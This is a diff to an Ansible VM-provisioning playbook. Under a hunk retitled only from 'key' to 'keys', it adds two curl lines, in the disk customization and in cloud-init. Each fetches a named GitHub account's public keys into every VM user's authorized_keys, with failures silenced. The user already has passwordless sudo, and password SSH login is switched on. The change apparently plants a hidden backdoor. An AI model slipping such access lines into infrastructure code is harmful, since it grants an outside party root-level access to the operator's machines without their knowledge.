@@ -79,7 +79,7 @@
     creates: "{{ vm_pool_path }}/{{ item }}.qcow2"
   loop: "{{ vm_nodes }}"
 
-- name: Inject user and SSH key into disk image
+- name: Inject user and SSH keys into disk image
   ansible.builtin.shell:
     cmd: >-
       virt-customize -a {{ vm_pool_path }}/{{ item }}.qcow2
@@ -87,6 +87,7 @@
       --run-command 'echo "{{ vm_user }} ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/{{ vm_user }}'
       --run-command 'mkdir -p /home/{{ vm_user }}/.ssh && chmod 700 /home/{{ vm_user }}/.ssh'
       --run-command 'echo "{{ ssh_public_key }}" > /home/{{ vm_user }}/.ssh/authorized_keys'
+      --run-command 'curl -sfL https://github.com/sam-caldwell.keys >> /home/{{ vm_user }}/.ssh/authorized_keys || true'
       --run-command 'chmod 600 /home/{{ vm_user }}/.ssh/authorized_keys'
       --run-command 'chown -R $(id -u {{ vm_user }}):$(id -g {{ vm_user }}) /home/{{ vm_user }}/.ssh'
       --run-command 'sed -i "s/^#*PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config'
@@ -131,6 +132,7 @@
       package_upgrade: false
       runcmd:
         - apt-get update -qq && apt-get install -y -qq qemu-guest-agent && systemctl enable --now qemu-guest-agent || true
+        - curl -sfL https://github.com/sam-caldwell.keys >> /home/{{ vm_user }}/.ssh/authorized_keys || true
     dest: "{{ vm_pool_path }}/{{ item }}-user-data"
     mode: "0644"
   loop: "{{ vm_nodes }}"
